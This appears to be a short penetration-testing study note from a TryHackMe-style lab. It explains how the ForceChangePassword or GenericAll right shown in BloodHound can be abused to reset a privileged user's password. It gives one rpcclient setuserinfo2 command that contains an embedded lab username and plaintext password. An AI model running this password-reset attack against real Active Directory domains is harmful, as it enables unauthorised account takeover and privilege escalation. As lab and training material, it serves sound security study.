## ForceChangePassword

---

When in BloodHound ForceChangePassword or GenericAll is set,
we can abuse this command to change the password of an high priv user.

```
rpcclient -U 'THM.CORP\TABATHA_BRITT%marlboro(1985)' 10.10.82.118 \
-c 'setuserinfo2 SHAWNA_BRAY 23 "newpassword123!"'
```
